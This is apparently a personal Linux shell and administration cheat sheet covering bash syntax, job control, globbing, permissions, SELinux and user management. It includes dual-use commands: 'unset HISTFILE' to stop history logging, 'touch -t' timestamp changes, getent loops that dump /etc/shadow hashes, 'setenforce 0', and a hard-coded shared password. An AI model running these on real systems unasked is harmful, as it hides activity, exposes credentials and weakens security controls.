NUM1 -ne NUM2 	| True if NUM1 and NUM2 are not equal 
NUM1 -lt NUM2 	| True if NUM1 is smaller than and not equal to NUM2 
NUM1 -le NUM2	| True if NUM1 is smaller or equal to NUM2
NUM1 -gt NUM2	| True if NUM1 is greater and not equal to NUM2
NUM1 -ge NUM2	| True if NUM1 is greater or equal to NUM2
-e FILE 		| True if FILE exists
-d FILE 		| True if FILE is a directory
-f FILE 		| True if FILE exists and is a regular file 
-s FILE 		| True if FILE exists and is not empty
-x FILE 		| True if FILE exists and is executable   
-v VAR_NAME		| True if VAR_NAME has been set 
-R VAR_NAME		| True if VAR_NAME has been set AND ias a nameref variable 

## Test Conditionals
Syntax				| Definition
---					| ---
test (EXPR)			| True if EXPR is True 
test ! EXPR			| True if EXPR is False
test EXPR1 -a EXPR2 | True if both EXPR1 and EXPR2 are true
test -o OPTION_NAME	| True if shell OPTION_NAME is set 
test -v VAR_NAME	| True if VAR_NAME has been set 
test -R VAR_NAME	| True if VAR_NAME has been set AND ias a nameref variable 

}}} #
{{{	#CSH
	- https://www.cs.bgu.ac.il/~yaeln/cp011/classes/class6.html
	
Argument| Definition
 :h		| Returns the directory of a path or "head"
 :t		| Returns the filename of a path or "tail"
 :r		| Returns the directory and filename without the last extension or "root"
 :e		| Returns the extension of the path or "end"
 
}}} #
{{{ #history
	- Get command history (History is written on shell exit)
		$ history 
	- append to history file
		$ history -a 
	- Clear history in current shell 
		$ history -c 
	- Load updated history into current shell 
		$ history -r
	- Prevent history from being saved at logout
		$ unset HISTFILE
		$ unset savehist 	#CSH
	
}}} #
{{{ #Jobs 
	- Suspend a job 
		$ CTRL+z
		$ suspend
	- restart a suspended job and send it to background
		$ bg 1
	- bring a job to foreground
		$ fg 1
	- Show current background jobs 
		$ jobs 
	- suspend script execution until background jobs finish
		$ wait
	- kill jobs 
		$ kill
	- Don't track a job with the shell 
		$ nohup yeet.sh &
	- Stop tracking a currently running background job 
		$ disown 
	- run a job in background 
		$ for i in $(seq 100);do echo $i && sleep 5;done &
	
}}} #
{{{ #Other
	- Signals (trap)
		- https://man7.org/linux/man-pages/man7/signal.7.html
		- Catch Signals and execute code
			- On EXIT, trap will remove yeet.txt
				$ trap "rm -f yeet.txt" EXIT
			- On Ctrl-C echo "Frig Off"
				$ trap "echo 'Frig Off'" SIGINT
	- execute a new shell
		$ exec ksh
	- time a command
		$ time echo "yeet for the cannon"
	- reload .bashrc
		$ source .bashrc
	- read input and put into variable 
		read request 	#request is the variable 
		$  echo -n "Enter your score [0-100%] ('q' for quit): "; read SCORE;
	- read file 
		$ for line in $(<flag3.txt); do echo "$line"; done;
	- Get Date and hour in miliatry time 
	  		$ DATE=`date +%Y%m%d`
	  		$ HOUR=`date +%H`

}}} #
{{{ #Examples 
- https://github.com/LeCoupa/awesome-cheatsheets/blob/master/languages/bash.sh

{{{ #Redirection
	- Examples
		- open yeet.txt and assign fd3 to it 
			$ exec 3<> yeet.txt
		- read 4 characters from open file with file descriptor (fd) 3. File cursor/pointer moves 4 characters forward
			$ read -n 4 <&3
		- write a decimal point at the file pointer position
			$ echo -n . >&3
		- close fd 3
			exec 3>&-
			
}}} #

##Scripting
{{{ #If
## Conditionals
	- Generic test Syntax
		$ if (test 1 -eq 2);then echo Yeet;else echo Yote;fi 
			- Yote 
	- Generic [] Syntax 
		$ if [ 1 -eq 2 ];then echo YEET;else echo Yote;fi	#Spaces are important with []
			- Yote 
	- Files Example
		$ if [ -e /etc/passwd ];then echo "/etc/passwd exists in the system";fi 

}}} #
{{{ #For  
	- List files in dir 
		$ for FILE in $HOME/.bash*; do echo $FILE; done

}}} #
{{{ #Until
	- Print 0-9
		$ a=0; until [ $a -eq 10 ]; do echo $a; a=`expr $a + 1`;done 

}}} #
{{{ #While 
	- Print 0-9
		$ a=0; while [ $a -lt 10 ]; do echo $a; a= `expr $a + 1`; done

}}} #

}}} #
{{{ #Symbols

Symbol	| Usage 
---		| ---
$ "" 	| # Quote with variable usage
$ '' 	| # Quote without variable usage 
$ \ 	| # Escape
$ $$ 	| # Get ProcessID
$ $0	| # Get Command Name (shell name)
$ $5 	| # Get Argument ($1-$9, then ${10} and up)
$ $*	| # Get All arguments in string (starting at $1)
$ #		| # Get All arguments in string (starting at $1)
$ $@	| # Get All arguments in list of strings #BASH only 
$ $# 	| # Shift (used if unknown number of arguments, start left and work right)
$ ~-	| # Get Previous working dir 
$ ~+	| # Get Current working dir 
$ ~name | # Get Users home dir 
$ !! 	| # Rerun last command 
$ !32	| # Rerun 32nd command in history list 
$ !$	| # Get last "word" of previous command
$ $?	| # Get status of last subprocess
$ $!	| # Get pid of most recently executed background process 
$ $<	| # Get input from user 
$ n> yeet.txt	| # fd into file 
$ n< yeet.txt 	| # open file for reading into fd
$ n<> yeet.txt	| # open file for reading and writing into fd 
$ 1> yeet.txt 	| # stdout to filename
$ 2> yeet.txt 	| # stderror to filename
$ &> yeet.txt	| # stderr and stdout to filename  
$ i>&j			| # fd i to fd j 
$ <&j			| # stdin to fdj
$ n<&-			| # close input fd n, which was open for reading.
$ n>&-			| # close output fd n, which was open for writing.
$ 0<&-			| # close fd stdin (fd0)	
$ 1>&-			| # close stdout (fd1)

}}} #
{{{ #Variable Expansion (+Globbing)
## Notes 
	- excluding touch, * is a variable
	- No regex is used. All Globbing.
	
## Globbing
	- Enable globbing (in current shell session)
		$ shopt -s extglob
	- remove all files except install.log 
		$ rm -f !(install.log)
	- list all install and uninstall files with log or sh or none extensions
		$ ls -l +(install|uninstall).*(log|sh)
	- list all files except .jpg and .gif
		$ ls !(*.jpg|*.gif)
		
### Globbing Symbols 
Symbol	| Deffinition
---		| ---
?		| Match none or 1 instance 
*		| Match none or any instances
+		| Match one or more instances 
@		| Match 1 instance 
!		| Match anything not this instance 
	
## Usage
	- pathname expansion (use dir structure to get filenames)
		$ ls []
		$ ls -l /etc/pam.d[^pf]*
	- Math expansion 
		$ echo $[$a + $b]
		$ i=$(expr $i + 1)
		$ ((b = $a + 1 ))
		$ let a-=1
		$ interest_rate=$(echo "scale=9; $interest_rate/100.0" | bc)	#scale is needed to determine how many decimal points to go to 
	- Text expansion
		$ {}
		$ echo r{ea,o}d
			- read rod 
	- Command substitution
		$ ``
		$ $()
		$ echo today is `date`
		$ echo "today is $(date)"
	- Examples 
		- In certain dirs, files with numbers that end in .conf 
			$ ls /etc/@(krb5|security|apache|crypto)/*{0,1,2,3,4,5,6,7,8,9}*.conf 2> /dev/null
			$ mkdir -p /stooge/{larry,moe,shemp,curly,joe}
	

Function			| Example
---					| ---
Simple Usage		| $PARAM
					| ${PARAM}
Indirection			| ${!PARAM}
Case Modification  	| ${PARAM^}
					| ${PARAM^^}
					| ${PARAM,}					
					| ${PARAM,,}
					| ${PARAM~}
					| ${PARAM~~}
Variable name Expand| ${!PREFIX*
					| ${!PREFIX@}
SubString Removal	| ${PARAM#PATT} (Removes PATT and After)
					| ${PARAM##PATT}(Removes PATT and After)	
					| ${PARAM%PATT}	(Removes PATT and Before)
					| ${PARAM%%PATT}(Removes PATT and Before)
Search And Replace	| ${PARAM/PATT/STRING}
					| ${PARAM//PATT/STRING}
					| ${PARAM/PATT}
					| ${PARAM//PATT}
String Length		| ${#PARAM}
SubString Expansion	| ${PARAM:OFFSET}
					| ${PARAM:OFFSET:LENGTH}
Use a default Value	| ${PARAM:-WORD}
					| ${PARAM-WORD}
Use Alt Value		| ${PARAM:+WORD}
					| ${PARAM+WORD}
Display error if	| 
	null or unset	| ${PARAM:?WORD}
					| ${PARAM?WORD}
					
}}} #
{{{ #Variables and Aliases
## Notes
	- Aliases are Generally in the ~/.[bash|c|k]rc file	

## Aliases
	- List Aliases
		$ alias 
	- alias creation
		$ alias yeet="whoami && id"

## Variables 

### BASH 
	- Define a variable 
		$ varname=varvalue
	- Retrieve variable 
		$ $varname 
	- Make variable global 
		$ export varlist	#can export multiple variables in one line 
	- Undefined a variable 
		$ unset varname 
	- list the names and values of all shell variables and funcitons
		$ set 	
	
### CSH
	- Define a local variable
		$ set varname = varvalue 
	- Define a global variable 
		$ setenv varname = varvalue 
	- Retrieve variable 
		$ $varname 
	- Undefine a local variable 
		$ unset varname 
	- Undefine a global variable 
		$ unsetenv varname 
	- list the names and values of all shell variables and funcitons
		$ set 	
		
}}} #	

}}} ###
{{{ ###Tool Syntax 
{{{ #dd
	- Get MBR
		$ dd if=/dev/sda bs=512 count=1
	- Get Superblock (if block size is 1024)
		$ dd if=/dev/sda1 bs=512 skip=2 count=2 | od -t x1
		$ dd if=/dev/sda1 bs=1k skip=1 count=1 | hexdump -C
	- create a file with 250MB of null bytes 
		$ dd if=/dev/zero of=/tmp/my_stuff.img bs=2M count=125
	- Replace a single charachter at offset 0x180 (384)
		$ echo -n L | dd of=/boot/grub/stage1 bs=1 seek=384 conv=notrunc
		
}}} #
{{{ #echo
	- no new line at end 
		$ echo -n "yeet for the cannon"
		$ read yeets 

}}} #
{{{ #ln
	- Create Hard link 
		$ ln source_file hard_link_file
	- Create Soft link 	(Can be created to a directory)
		$ ln -s source_file symbolic_link

}}} #
{{{ #lsof 
	- Get streams 
		$ lsof type=stream 

}}} #
{{{ #Package Managers
	- Get Program versions
		$ rpm -qa|grep TireFire
		$ apt-cache show TireFire
		$ apt policy TireFire		


}}} #
{{{ #SeLinux
	- Config 
		- /etc/selinux/config 
		
	- Modes 
		> Enforcing: BLOCKS APPLICATIONS from working if there is no policy in place to allow access.
			- Default CentOS/RHEL 7
			- Denial Logs:
				- "type=AVC" 
				- "blocked"		: When a block occurs 
				- "comm="		: 
		> Permissive: ONLY LOGS
			- does not prevent any access operations from occurring, however it will log an auditd AVC message
			- "type=AVC"
			- "blocked" < will not exist 
			
		> Disabled: Does not block or log 

	- Commands 
		- Get SeLinux status 
			$ sestatus 
		- Get SeLinux mode 
			$ getenforce
		- Set SeLinux mode 
			$ setenforce 0	#Permissive
			$ setenforce 1	#Enforcing
		- Enable/Disable SeLinux 
			$ vim /etc/selinux/config 
			$ init 6
			
}}} #
{{{ #tar
	- Nix
		- zip as tar.gz
			$ tar -cvzf outfile.tar.gz /dirname
		- zip as tar 
			$ tar -cvf outfile.tar /dirname
		- zip a tar that will extract to /var/run 
			$ tar -cvf outfile.tar -C /dirname .
		- unzip 
			$ tar -xvf filename
		- unzip a password protected file 
			$ 7z  x  -pPASSWORD  your-file.zip
		- list contents of tarball
			$ tar -tf run1.tar 
		- extract a single file from tarball 
			$ tar -xf run1.tar filename_to_extract
		- extract file on line 17
			$ tar -xf run1.tar `tar -tf run1.tar | head -n 17 | tail -n 1` 
			
}}} #
{{{ #tcpdump
	- Generic Syntax
		$ tcpdump -tvvvn
		$ tcpdump src 198.18.31.253 and dst 192.168.11.15

}}} #
{{{ #touch
	- Modify file time 
		$ touch -t YYYYMMDDhhmm /full/path/Yeet 
	- NOTES:
		- -m update modify time
		- -t update access and modify time
		- nothing updates everything
		- -a updates access only
		- -r use another files times
		- Time: 
			- modified time = change of contets of file
			- access time = last time data of file was accessed
			- change time = change of metadate (name, size, permissions)
			
}}} #
{{{ #w 
- Generic Syntax (gets users with login shells)
	$ w

}}} #
{{{ #whois
	- Check hash against website
		$ md5sum /root/yeet 
			- asdfasdf
		$ whois -h hash.cymru.com asdfasdf

}}} #

}}} ###
{{{ ###Users and Permissions	
{{{ #Access Permissions Notes
	{{{ #Order of Operations 
		- USER >: Group >: Other
		- If a permission applies, 
		- Example:
			- IF: User:Access UsersGroup:DeniedAccess Other:NA Access:Successful
			- IF: User:NA UsersGroup:DeniedAccess Other:Access Access:NotSuccessful 
		- If + in permissions:
			- Check facl
				$ getfacl 
	
	}}} #
	{{{ #Permissions Definitions
	> Read:
		- DIR: 	Access the names of files in that directory
		- File: Review or display the content of the file
	> Write:
		- DIR:
			- Modify information about the directory itself, such as its name and attributes, 
			- Add/Delete files to the directory	(In ADDITION to Dir Execute Permissions!!)
			- Rename files in the directory
		- File:
			- Modify the file content
	> Execute:
		- DIR: 
			- Enter or traverse the directory to perform actions and access on its files and subdirectories
			- Add/Delete files to the directory	(In ADDITION to Dir Write Permissions!!)
		- File: 
			- Execute the file when it is a script or a program
			- Scripts need READ permission also to execute
	> SUID: 
		Dir: Nothing
		File: When Executed, Files UID becomes the Processes EUID	(Does not apply to bash/python scripts)
	> SGID:
		Dir: group that owns the directory to be assigned as the owning group of all files created within that directory (Not Recursive)	(Does not apply to bash/python scripts)
		File: When Executed, Files GID becomes the Processes EGID 
	> Sticky: (Restricted Deletion Flag)
		Dir: Stops UnPrivilieged users from removing/renaming files in the dir (unless they own the file or the directory)
		File: Nothing
	> UID 0: root (uid=0) can do just about anything, including changing their own UID.
	> GID 0: No special Privilieges. Just a normal group. 
		
	}}} #
	{{{ #Permissions Needed To...
		- Access a DIR:
			- All Parent DIRs:	x
		- Read a File
			- DIR: 	x
			- File:	r
		- Modify File
			- DIR:	x
			- File:	w	
		- Create File
			- DIR: 	wx
			- File:	
		- List Files
			- DIR:	r
			- File:	
		- List Files And Metadata
			- DIR:	rx
			- File: 
		- cd into DIR:
			- DIR: 	x
			- File: 
		- rm Files
			- DIR:	wx
			- File:	w	
		- rm -f Files 
			- DIR:	wx 
			- File:	
		- Add Files 
			- DIR:	wx 
			- File:
		- Recursivly Remove Files
			- Works from /root/ down 
		- Execute Script
			- DIR:	x
			- File:	rx
		- Execute Binary 
			- DIR:	x
			- File:	x 
	
?access to the directory?
	}}} #
	
	{{{ #CanUserLogin?
		$ for acc in `getent passwd | egrep ".*sh$" | cut -d ':' -f1`;do getent shadow $acc;done | awk -F ":" '$2!~/^*|^!|^$/{print $0}' 
		- /etc/nsswitch.conf 
			- Files 
				- /etc/passwd 
					- Does the user have a Password? 
						- If No, it can still be in /etc/shadow 
					- Does the user have a login shell?
						- Doest That login shell exist/is it a real shell?
				- /etc/shadow
					- Does password start with NOT start with * or ! 	#*=disabled,!!=locked
					- Is password blank?
						- Is no password login allowed? (Find file that needs to be checked)
					- Is password expired?
	
	}}} #
	{{{ #CheckList
		$ user=squid && getent shadow $user && getent passwd $user && getent group | grep $user 
		$ cat /etc/profile /etc/profile.d/* /etc/bashrc ~squid/.{bash_profile,profile,bashrc} | less 	#Follow Readins #Watch $ id -gn = id -un 
		$ namei -l /path/to/check/ 

	}}} #
	
}}} #
{{{ #chage
	- Get user Password info 
		$ chage -l squid 
	- Expire user password (force password change at next login)
		$ chage -d 0 user1
	
}}} #
{{{ #chown/chgrp/chmod
	> chown: Only root can chown a file 
		$ chown NewOwnerUser Filename
		$ chown NewOwnerUser Dirname -R	#Recursive
		$ chown NewOwnerUser:NewGroup Dirname 
		$ chown :NewGroup Filename 
	> chgrp: Only file owner or root can chgrp a file 
		- Owner can only change to a group he is a member of 
		$ chgrp admins FileName 
	> chmod:
		- root can change all file permissions
		- Users can only change permissions of files they own.
		- SUID:4 SGID:2 Sticky:1
		- Read:4 Write:2 Execute:1
		- If a file is referenced That does not exist, Command errors.
		$ chmod u+rw,g=x,go-wx /home/yeet.sh	#applies left to right
		$ chmod u+rw,g=,o=u /home/yeet.sh		#"g=":---
		$ chmod 653 /home/yeet.sh				#
		$ chmod u+s /home/yeet.sh				#set SUID flag
		$ chmod g+s /home/yeet.sh				#set SGID flag 	#o+s does nothing
		$ chmod +t /home/						#set sticky bit
		$ chmod o+t /home/						#set sticky bit (exactly the same)(sticky is only set to Other)
		$ chmod -R o+X /home 					#Add Execute Permission Recursivly to Dirs ONLY.
		
}}} #
{{{ #getfacl/setfacl
	- Notes:
		- DAC (Discretionary Access Control 
		- Allows the owner of a file to grant access permissions to that file, to specific users
	- Get facl
		$ getfacl yeet.sh
		$ getfacl /root 

}}} #
{{{ #getent 
	- Generic syntax 
		$ getent [-s <database_type>] <database> [<entry>]
	- Get all entries from all databases 
		$ getent passwd squid 	#for just user squid 
		$ getent shadow
		$ getent group 
	- Get all entries from specified database #Specifc entry can always be specified 
		$ getent -s ldap passwd 
		$ getent -s sss group (groupname)	#All entry dump disabled by default on sss
		$ getent -s files shadow 
	- Get all User Accounts with UID of 500-1019 that can login (assuming blank password is dissallowed)
		- Can login=
			- passwd login shell
			- login shell exists
			- has password in shadow (not ::,\*,!.*)
		$ for acc in `getent passwd | awk -F ':' '{ if($3>=500) if($3<=1019) print $0 }' | egrep ".*sh$" | cut -d ':' -f1`;do getent shadow $acc;done | awk -F ":" '$2!~/^*|^!|^$/{print $0}'  
	- Get running ldap services 
		$ service --status-all | grep running | egrep "nslcd|nscd"
	
}}} #
{{{ #ls
	- Generic Syntax 
		$ ls -l /etc/passwd 
		- -rw-r--r-- 1 root sys 1134 Aug 11 12:43 /etc/passwd 
		- Type:Permissions:HardLinksToFile:Owner:Group:SizeInBytes:ModDateTime:FileName
		> Type: -:RegularFile d:Directory l:SymLink c:CharacterFile b:BlockFile
		- rwsr--r-- = SUID and u+x
		- rwSr--r-- = SUID and u-x
		- rwxr-sr-- = SGID and g+x
		- rwxr-SLr--= SGID and g-x 	#S or L depending on OS
		- rwxr-xr-t	= Sticky and o+x
		- rwxr-xr-T = Sticky and o-x #Sticky will only show up on Dirs
	- Get most recently modified files 
		$ ls -latr /usr/bin | grep tail 
	- Get Process Executable Location 
		$ ls -l /proc/<PID>/path/a.out
	- Get Inode/s
		$ ls -i /yeet 
	- Potential ls replacment
		$ vdir -lisa
	- Time 
		- mtime
			$ ls -l 
		- atime 
			$ ls -lu 
		- ctime
			$ ls -lc 
		
}}} #
{{{ #mv
	- Notes: 
		- mv "stat failed", Trying to move folder 											FROM 	file you do not have access.
		- mv "Failed to access (destination) Permission Denied", Trying to move a folder 	TO 		somewhere you do not have access.
		- If both, "Failed to access (destination) Permission Denied"

}}} #
{{{ #namei
	- Get Dir Permissions Back to Root 
		$ namei -l /Yeet/Cannon/Four/Life/	#Better than ls each to verify "x"

}}} #
{{{ #passwd 
	- Generic Syntax 
		$ passwd fred	#Only root can do this  
		$ passwd
	- Expire a users account 
		$ passwd --expire squid

	}}} #
{{{ #stat
	- Get File Birth|Create time 
		$ stat -c "%w" yeet.sh 		# Returns - if it is not stored	

}}} #
{{{ #su/sudo
	- Must be in "wheel" group to use $ su 
	- Get root as Non-Login Interactive Shell 
		$ su 
	- Get root as Login Interactive Shell
		$ su -
		$ su --login 	#unverified
		- Notes:
			- All environment variables, except TERM, are cleared
			- Environment variables HOME, SHELL, USER, LOGNAME, and PATH are initialized
			- The current working directory is switched to the target user home directory and appropriate shell startup scripts are executed	
	- Get user as Login Interactive Shell 
		$ su - Fred
		- su Notes:
			- su often logs to /var/*/sulog
	- Run program as another user
		$ sudo -u root ./yeet.sh 
		- Notes:
			- Verified via /etc/sudoers
			- real UID and GID, as well as EUID and EGID are set to match those of the target user
			- group vector is initialized based on the group file 
			- shell environment variables are passed to the new process.
		
}}} #
{{{ #umask
	> umask: Default Access Permisions = Default Access Permissions - umask 	
	- Permission Defaults:
		- Dir:777
		- File:666
	- Example1: 
		- Dir:777 
		$ umask 022
		- Dir:755
	- Example2:
		- File:666
		$ umask u=rw,go=rx #:655 inverse:122 666-122:644 #Fo-Real doe
		- File:644	
	- Get a bash users umask 
		$ cat /etc/profile.d/* /etc/profile /etc/bashrc ~hermes/.{profile,bashrc,bash_profile} | less 	#Follow Readins

}}} #
{{{ #useradd/userdel/usermod
	- Generic syntax 
		$ useradd -m fred 
		$ useradd fred -s /bin/bash -d /export/home/fred -m 		#-m creates home dir if it does not exist 
		$ useradd john --home=/home/john --shell=/bin/csh --gid=staff 
	- View defaults 
		$ useradd -D 
	- Edit defaults (base dir)
		$ useradd -D -b /export/home 
	- Group add 
		$ for user in larry moe shemp curly joe; do useradd $user --shell=/bin/bash --home=/home/$user --gid=stooges; echo "L33tHax0r" | passwd --stdin "$user"; done
	
	- Remove a user and home dir 
		$ userdel curly --remove
		
	- Disable a user 
		$ usermod --shell=/bin/false shemp
		
}}} #

}}} ###







